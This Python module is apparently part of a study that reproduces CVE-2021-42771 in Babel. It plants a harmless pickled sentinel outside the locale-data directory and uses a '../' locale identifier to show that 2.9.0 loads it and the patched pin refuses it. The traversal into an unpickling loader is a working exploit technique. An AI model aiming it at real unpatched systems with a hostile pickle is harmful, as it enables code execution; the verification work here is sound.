"""CVE-2021-42771 -- Babel loads locale data through a relative path (2.9.0 -> 2.9.1).

2.9.0 joined the locale identifier straight onto the locale-data directory, so an
identifier containing ``../`` read, and unpickled, a file outside it.

Oracle, declared before execution: ``localedata.load`` returns a sentinel value
that exists only in a file the probe placed OUTSIDE the locale-data directory.
The traversal is proven by the content that came back, not by the path that went
in -- which matters, because the path is something the probe supplied and the
content is not.

The out-of-tree file is written into the pin's own vendored tree's parent, which
is inside this study's ``vendor/`` directory. Nothing outside it is touched.
"""

from __future__ import annotations

import os
import pickle

from ._support import pinned_version

DIST = "babel"
MODULE = "babel"

_SENTINEL_KEY = "cve_study_sentinel"
_SENTINEL_VALUE = "this file is outside the locale-data directory"
#: No underscores. Babel resolves a locale's parent by splitting the identifier
#: on '_', so a name like "cve_study_outside" sends load() hunting for a
#: "cve_study" parent and the probe fails on a missing *parent*, not on the
#: traversal it is testing. That cost one debugging round and is worth a comment.
_SENTINEL_NAME = "cvestudyoutside"


def _plant() -> str:
    """Write the out-of-tree .dat and return the identifier that reaches it."""
    from babel import localedata

    parent = os.path.dirname(localedata._dirname)
    path = os.path.join(parent, _SENTINEL_NAME + ".dat")
    with open(path, "wb") as handle:
        pickle.dump({_SENTINEL_KEY: _SENTINEL_VALUE}, handle)
    return path


def liveness(ctx: dict) -> tuple[bool, str]:
    """A real locale must load, and the pin must be the pin."""
    origin = pinned_version(DIST, MODULE, ctx["version"], ctx["pin_dir"])
    from babel import localedata

    data = localedata.load("en")
    ok = isinstance(data, dict) and bool(data)
    return ok, (
        f"benign load('en') -> {len(data)} keys from {os.path.basename(origin)}; "
        f"data dir {os.path.basename(localedata._dirname)}"
    )


def control(ctx: dict) -> tuple[bool, str]:
    """The same oracle on an in-tree identifier. Must NOT fire."""
    from babel import localedata

    _plant()
    data = localedata.load("en")
    leaked = _SENTINEL_KEY in data
    return leaked, f"in-tree load('en') leaked_sentinel={leaked}"


def exploit(ctx: dict) -> tuple[bool, str]:
    from babel import localedata

    path = _plant()
    identifier = "../" + _SENTINEL_NAME
    try:
        data = localedata.load(identifier)
    except FileNotFoundError:
        # The probe classifies this itself, and the reason is worth stating.
        #
        # On the patched pin the refusal mechanism *is* a missing file: the fix
        # basenames the identifier, so the loader looks for the sentinel inside
        # the locale-data directory, where it correctly is not. Passing the raw
        # OSError text up would hand the harness the string "No such file or
        # directory", which its confound table reads as "a precondition for
        # your test was missing" -- and the run would be filed CONFOUNDED when
        # the truth is that the boundary held.
        #
        # Only the probe can tell those two apart, because only the probe knows
        # which file was expected to be absent. This is reported in
        # docs/cve-study.md as a measured limit of mechanical confound
        # classification, not papered over: a generic pattern table cannot
        # distinguish a target refusing by not finding something from a rig
        # failing by not finding something.
        return False, (
            "traversal refused: the loader resolved the identifier back inside the "
            "locale-data directory and the sentinel was not returned (FileNotFoundError "
            "on the in-tree path, which is the fix behaving correctly)"
        )
    except Exception as exc:
        return False, f"refused: {type(exc).__name__}: {str(exc)[:120]}"
    leaked = isinstance(data, dict) and data.get(_SENTINEL_KEY) == _SENTINEL_VALUE
    return leaked, (
        f"load({identifier!r}) returned sentinel={leaked}; planted at {os.path.basename(path)}"
    )
